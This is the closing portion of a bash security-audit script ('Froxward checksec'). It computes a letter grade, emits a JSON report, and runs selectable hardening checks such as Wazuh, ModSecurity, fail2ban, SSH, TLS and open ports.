    if   (( grand_pct >= 90 )); then grade="A+"
    elif (( grand_pct >= 80 )); then grade="A"
    elif (( grand_pct >= 70 )); then grade="B"
    elif (( grand_pct >= 60 )); then grade="C"
    elif (( grand_pct >= 50 )); then grade="D"
    else                              grade="F"
    fi

    echo ""
    echo "  },"
    printf '  "total": %d,\n' "$grand_total"
    printf '  "max": %d,\n' "$grand_max"
    printf '  "percent": %d,\n' "$grand_pct"
    printf '  "grade": "%s",\n' "$grade"
    printf '  "checks": {"pass": %d, "fail": %d, "warn": %d}\n' "$PASS" "$FAIL" "$WARN"
    echo "}"
}

# =============================================================================
#  ENTRYPOINT
# =============================================================================
usage() {
    echo "Usage: sudo bash $0 [OPTIONS]"
    echo ""
    echo "Options:"
    echo "  -h, --help       Show this help"
    echo "  --json           Output results as JSON (to stdout)"
    echo "  --only MODULES   Run only specified modules (comma-separated)"
    echo "                   Modules: wazuh,modsec,ddos,soar,fail2ban,headers,ssh,ports,tls,os"
    exit 0
}

main() {
    local json_mode=0
    local only_modules=""

    for arg in "$@"; do
        case "$arg" in
            -h|--help) usage ;;
            --json)    json_mode=1 ;;
            --only)    : ;;  # next arg handled below
            *)
                # Handle --only VALUE
                if [[ "${prev_arg:-}" == "--only" ]]; then
                    only_modules="$arg"
                fi
                ;;
        esac
        prev_arg="$arg"
    done

    should_run() {
        [[ -z "$only_modules" ]] && return 0
        echo ",$only_modules," | grep -q ",$1,"
    }

    (( json_mode )) || {
        clear
        echo -e "${C}${B}"
        cat <<'BANNER'
    ███████╗██████╗  ██████╗ ██╗  ██╗██╗    ██╗ █████╗ ██████╗ ██████╗
    ██╔════╝██╔══██╗██╔═══██╗╚██╗██╔╝██║    ██║██╔══██╗██╔══██╗██╔══██╗
    █████╗  ██████╔╝██║   ██║ ╚███╔╝ ██║ █╗ ██║███████║██████╔╝██║  ██║
    ██╔══╝  ██╔══██╗██║   ██║ ██╔██╗ ██║███╗██║██╔══██║██╔══██╗██║  ██║
    ██║     ██║  ██║╚██████╔╝██╔╝ ██╗╚███╔███╔╝██║  ██║██║  ██║██████╔╝
    ╚═╝     ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝ ╚══╝╚══╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝
                   🛡  SECURITY AUDIT · checksec.sh
BANNER
        echo -e "${N}"
    }

    require_root
    echo "=== Froxward checksec: $(date) ===" > "$REPORT_FILE"

    detect_env
    should_run wazuh    && check_wazuh
    should_run modsec   && check_modsecurity
    should_run ddos     && check_ddos
    should_run soar     && check_soar
    should_run fail2ban && check_fail2ban
    should_run headers  && check_headers
    should_run ssh      && check_ssh
    should_run ports    && check_open_ports
    should_run tls      && check_tls
    should_run os       && check_os_hardening

    if (( json_mode )); then
        print_json_report
    else
        print_score
    fi
}

main "$@"
